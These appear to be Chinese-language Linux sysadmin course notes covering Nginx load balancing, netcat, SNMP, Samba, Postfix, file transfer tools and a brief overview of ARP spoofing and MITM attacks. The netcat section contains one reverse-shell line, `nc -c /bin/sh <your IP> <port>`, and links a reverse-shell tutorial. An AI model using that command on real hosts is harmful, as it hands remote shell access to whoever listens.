tags: `1062` `LSA` `Web Servers` `ncnu` `checkinstall` `ftp` `scp` `nc` `snmp` `fakeroot` `mysql backup` `samba` `postfix` `smtp`
# 1062 LSA Week 02 - Review : 

## Nginx

**Load Balancing with Nginx**
what is load balancing
![load balancing](http://artica-proxy.com/wp-content/uploads/2015/12/load-balancing-proxy.png)

`/etc/nginx/sites-available/{檔名}`
>
>```
>upstream pool {
> server 127.0.0.1:8080; // server 1
> server 10.21.20.123:80; // server 2
>}
>
>server {
>
>  server_name bluet.org;
>  
>  location / {
>    proxy_pass http://pool;
>  }
>  
>}
>```
`$ sudo ln -s /etc/nginx/sites-available/{name} /etc/nginx/sites-enabled/`
如此使用瀏覽器造訪 http://bluet.org/ 就會隨機跑到 8080 port 或 80 port 的 server

### 自定義 domain 對應

使得自己主機上能解析自定義 domain
編輯 /etc/hosts (此爲 DNS 設定)


## checkinstall

許多OpenSource的軟體沒有提供針對某些distro的binary package，很多時候要自己編譯+安裝，但make install的時候較難追蹤檔案的安裝位置，較好的方法是讓package manager(dpkg)來管理他們。

Checkinstall可以製作安裝包，避免安裝後想移除不知道要去哪些地方刪除
```
$ ./configure && make && make install # 傳統方式直接安裝
＄ ./configure && make && checkinstall # 新方法先製作安裝包

```
## nc

可參考[常見用法](https://blog.gtwang.org/linux/linux-utility-netcat-examples/)

- 測試 TCP port 有沒有開
`$ nc -v 192.168.0.175 9527`

- 打出 UDP 封包
`$ echo -n "I ❤ LSA!!" | nc -u -w1 192.168.1.8 9527`

- 聽 UDP 封包
`$ nc -lu localhost 9527`

- 接 stdin stdout
[nc hook](https://null-byte.wonderhowto.com/how-to/create-reverse-shell-remotely-execute-root-commands-over-any-open-port-using-netcat-bash-0132658/)
`nc -c /bin/sh <your IP> <any unfiltered port>
`

###### 用nc來接stdin 
- server1 : `nc -l 1234 (port號)`
- server2 : `nc server1_ip 1234`
[name=yiyu]

## SNMP 簡易網路管理協定

### 你得先知道

- MIB: 描述被管理設備上的參數的樹狀數據結構，有標準預設代號，各間廠商也可以定義私人數值，需要向相關單位申請
- community: 通關密碼

### snmpwalk
主動去問設備

`$ snmpwalk -v2c -c public -O e 127.0.0.1`

- -v 爲使用版本，上述例子是使用 2c 版本
- -c 是指 community，也就是你得告訴設備通關密碼，它才會給你資訊

### snmptrap
叫設備主動告訴你，通常是緊急狀況

`$ snmptrap -m ./sample- trap.mib  -v 2c -c public 16.157.76.227:1622`

### snmpget
取得自己ip位址上的某一特定OID的VALUE和NAME

`$ snmpget v1 -c public <device IP> OID`
### MRTG

[link](http://163.22.17.70/mrtg/)

## fakeroot
模擬 root 權限，通常用來製作安裝包，將裏面文件擁有者設定爲 root

- 以打包做範例

```
$ fakeroot checkinstall --fstrans --install=no
```

## mysql autobackup
[谷歌傳送門](https://www.google.com.tw/search?ei=msT5Wdz_O8Gb0gSqzK74DQ&q=automysqlbackup+ppa&oq=automysqlbackup+ppa&gs_l=psy-ab.3..0i30k1j0i8i30k1.9162.9480.0.9571.4.4.0.0.0.0.86.86.1.1.0....0...1.1.64.psy-ab..3.1.86....0.X6IKtR0JxPQ)
```
$ sudo apt-get install automysqlbackup
$ sudo vim /etc/automysqlbackup/automysqlbackup.conf/
$ ls /var/lib/automysqlbackup
```
**記得把 automysqlbackup 加到 crontab**

## 傳檔案

### scp

- Usage:
`$ scp -p {port} {檔案名稱} {username}@{ip}:{路徑}`
- Example
`$ scp yoyodiy.txt username@8.8.8.8:~/ptt.cc/`

### sftp

只要有裝 ssh 就可以使用 sftp
```
$ sftp {username}@{ip}
$ lls  #列出本機當前資料夾文件
>> yoyodiy.txt  xxxxgay.txt
$ put yoyodiy.txt  game.txt # 上傳文件並且命名爲 game.txt
$ ls   #列出遠端當前資料夾文件
>> BlueT.heyhey
$ get BlueT.heyhey          # 下載BlueT.heyhey 
```

### ncftp

```
$ ncftp ftp.ncnu.edu.tw  # 不指定使用者，預設使用 anonymous
$ ncftp -u {username} -p {password}`  # 指定使用者登入
```

## samba

### 新增本機使用者

`$ sudo adduser {username}` adduser with home directory
`$ sudo useradd {username}` adduser without home directory

### 更改samba's config
`$ sudo vim /etc/samba/smb.conf`
> smb.conf檔內對底端增設
>> [{分享檔案名稱}]
>> comment = 
>> path = {PATH TO SHARE}
>> public = yes
>> writable = yes
>> ;read only = no
>> directory mode = 0755
>> create mode = 0755
>> 
>> [homes]
>>    comment = Home Directories
>>    browseable = no
>>    writable = yes
>>    create mode = 0644
>>    directory mode = 0755
   
>> [SharedDir]
>>    comment = Shared Directory 
>>    path = /Test
>>    public = yes
>>    writable = yes
>>    ;read only = no
>>    directory mode = 0755
>>    create mode = 0755
>>    valid users = @group  



>**0755 = rwxr-xr-x[color=blue]
>至於rwx是什麼，請參考LINUX鳥哥**
> 
### 連接測試
> linux/mac: 
> - `smb:\\{ip}`
> windows: 
> 1. `\\{ip}`
> 2. Windows Key + R, type `\\{ip}`
> 
### 設定群組
修改 /etc/group
`samba:x:1001:BlueT,Alice,Bob`
代表 BlueT,Alice,Bob 都在 samba 群組內

## postfix
`$ apt-get install postfix`
`$ sudo dpkg-reconfigure postfix`
`tab` > `ok` > `{name}` > `{username}`
`$ sudo netstat -ntupl|grep 25|less`
`$ ps aux|grep 24496`
`$ iptables -nL`
 

> [color=red]
> #### BT講解
> `$ sudo dpkg -i chrome-fdrtyttfy.deb` 
> -i = install
> `$ sudo apt install -f`
> `$ sudo dpkg-reconfisgure postfix` 把這個套件重新設定一次。
> #### aptitude
> `/` > `bad-mailx`
> `/` > `postfix`
> 可透過相依關係查詢
> ### postfix
> MTA contains 2 function
> : 1. send
> : 2. receive
> #### Configuration
> - Internet Site 由本機寄信
> - Internet with smarthost 交由其他郵件伺服器寄信
> - Local only 只能主機內使用者相互寄信
> #### Mail for the 'postmaster'
> - 如果有人寄給管理員，要轉送給誰
> #### network blocks for which this host should relay mail
> - 哪些網段的人可以寄信
> #### Local address extension character
> - 預設為 + 號
> - e.g., aaa+domain@gmail.com
> - 這是說寄給 aaa@gmail.com
> - 但是收件者可以自行將該信分類到 domain
> 0.0.0.0是指所有區段
> 
:::danger
安裝後請確保是否可執行以下指令：
1. iptables
2. route
:::
## smtp DEMO by yy.chang
> smtp 寄信protocol : 25
> `$ telnet smtp.ncnu.edu.tw 25`
> > HELO 
> > MAIL FROM:a@ncnu.edu.tw 
> > RCPT TO:{要寄給誰@mail.com} 
> > DATA
> > From : {sender@mail.com}
> > To : {who@mail.com}
> > Subject: {主旨}
> > {信件內容}
> > {type 什麼字元}
> > .
> > {type enter}
> > 


## [mailbox v.s. maildir](http://www.coctec.com/docs/service/show-post-30617.html)

### Mailbox

- 所有信件存放在同一個檔案
- Fast
### Maildir

- 每封信件個別爲一個檔案

#### format
- current 編寫中的信
- new 
- tmp 準備寄出的信

## 網路攻擊

### 常見攻擊

ARP: 在我想要連線到內網中某個ip(10.0.0.1)時，但我不知道它的mac address，所以我要先發一個廣播封包(arp request)問大家”安安，誰是10.0.0.1呢“，於是10.0.0.1的device就會回傳arp reply(unicast)，我就知道他的mac address了
[圖片支援](http://www.pcnet.idv.tw/pcnet/network/network_ip_arp.htm)
- [ARP欺騙](https://zh.wikipedia.org/wiki/ARP%E6%AC%BA%E9%A8%99)
     `$arp -a`

- [網路剪刀手](https://steachs.com/archives/902) 宿舍 switch 有綁定 uplink, 因此在學校宿舍不管用

- [MITM](https://blog.trendmicro.com.tw/?p=52362) - man in the middle attack 

### 防範攻擊 OSSEC -- HIDS

[OSSEC-HIDS](https://github.com/ossec/ossec-hids)

### 家用 AP

- [DMZ 非軍事區](https://blog.gtwang.org/linux/linux-utility-netcat-examples/)
- [虛擬伺服器](http://www.sapido.com.tw/CH/learning/virtual_server.htm)

[iTaiwan釣魚](http://www.duckll.tw/2018/02/itaiwan.html?m=1)

what is nologin, false in `sudo vipw ->3`
裏面的東東需要在 /etc/shells 有才會生效


## STUDY
other shell 
rssh, dropbear, restrict shell
chroot 做限制

### after install RSSH
`$sudo vim /etc/shells`
`$sudo vim /etc/passwd`

### 2人1組報告題目認領
1. What is `nologin`, `false` ($Don^2 Tsai$)
 `＄cat /etc/passwd`會發現到一些用戶被設定成
`/usr/sbin/nologin` `/bin/false`
如要拒絕系統用戶登錄，可以將該shell設定成
`＄usermod -s | --shell /usr/sbin/nologin username
`不允許系統login，可以使用其他ftp等服務
`$usermod -s | --shell /bin/false username
`禁止一切服務
3. Other shell (yiyu)
4. rssh (麒淞)
限制權限(只提供scp/sftp，可以設定登入的目錄)的傳檔工具
5. Dropbear(周沛群/王文璋)
小型ssh，支援包含UNIX等許多作業系統，可以拿來開發行動應用，方便跨平台使用。
6. Restrict shell (李恩賢)
7. chroot 做限制 （靖騰潤安）·[簡易設定](https://ez3c.tw/1820) [chroot設定](https://linux.cn/article-8313-1.html)
8. cacti 一倍、俊甫


# Proc file system by [遠正](https://www.facebook.com/profile.php?id=100002583104520)

每次噴的東西都是一個page ~_~

`$lsmod`

[kobject](http://www.wowotech.net/device_model/kobject.html)
